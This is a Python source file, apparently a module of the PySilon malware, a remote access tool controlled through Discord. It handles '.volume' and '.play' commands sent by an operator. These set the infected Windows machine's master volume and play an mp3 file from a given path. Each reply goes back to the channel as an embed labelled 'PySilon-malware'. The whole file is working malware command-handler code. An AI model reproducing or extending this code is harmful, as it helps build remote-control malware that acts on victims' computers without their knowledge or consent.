from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import pygame
import threading
import os

async def procesar_comandos_audio(message):
    if message.content.startswith('.volume'):
        await message.delete()
        argumentos = message.content.split()
        
        if len(argumentos) < 2 or not argumentos[1].isdigit():
            embed = discord.Embed(title="📛 Error", description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            mensaje_reaccion = await message.channel.send(embed=embed)
            await mensaje_reaccion.add_reaction('🔴')
        else:
            volumen_entero = int(argumentos[1])
            if 0 <= volumen_entero <= 100:
                dispositivos = AudioUtilities.GetSpeakers()
                interfaz = dispositivos.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volumen = cast(interfaz, POINTER(IAudioEndpointVolume))
                volumen.SetMasterVolumeLevelScalar(volumen_entero / 100.0, None)
                
                embed = discord.Embed(title="🟢 Success", description=f'```Successfully set volume to {volumen_entero}%```', colour=discord.Colour.green())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                mensaje_reaccion = await message.channel.send(embed=embed)
                await mensaje_reaccion.add_reaction('🔴')
            else:
                embed = discord.Embed(title="📛 Error", description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                mensaje_reaccion = await message.channel.send(embed=embed)
                await mensaje_reaccion.add_reaction('🔴')

    elif message.content.startswith('.play'):
        await message.delete()
        archivo_audio = message.content[5:].strip().strip('"').strip("'")
        
        if not archivo_audio:
            embed = discord.Embed(title="📛 Error", description='```Syntax: .play <path/to/audio-file.mp3>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            mensaje_reaccion = await message.channel.send(embed=embed)
            await mensaje_reaccion.add_reaction('🔴')
        elif not archivo_audio.lower().endswith('.mp3') or not os.path.isfile(archivo_audio):
            embed = discord.Embed(title="📛 Error", description='```Not a valid file or path does not exist.```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            mensaje_reaccion = await message.channel.send(embed=embed)
            await mensaje_reaccion.add_reaction('🔴')
        else:
            def reproducir_audio(ruta):
                pygame.mixer.init()
                pygame.mixer.music.load(ruta)
                pygame.mixer.music.play()
                reloj = pygame.time.Clock()
                while pygame.mixer.music.get_busy():
                    reloj.tick(10)
                pygame.mixer.quit()

            threading.Thread(target=reproducir_audio, args=(archivo_audio,), daemon=True).start()
            embed = discord.Embed(title="🟢 Playing", description=f'```Playing: {os.path.basename(archivo_audio)}```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            mensaje_reaccion = await message.channel.send(embed=embed)
            await mensaje_reaccion.add_reaction('🔴')
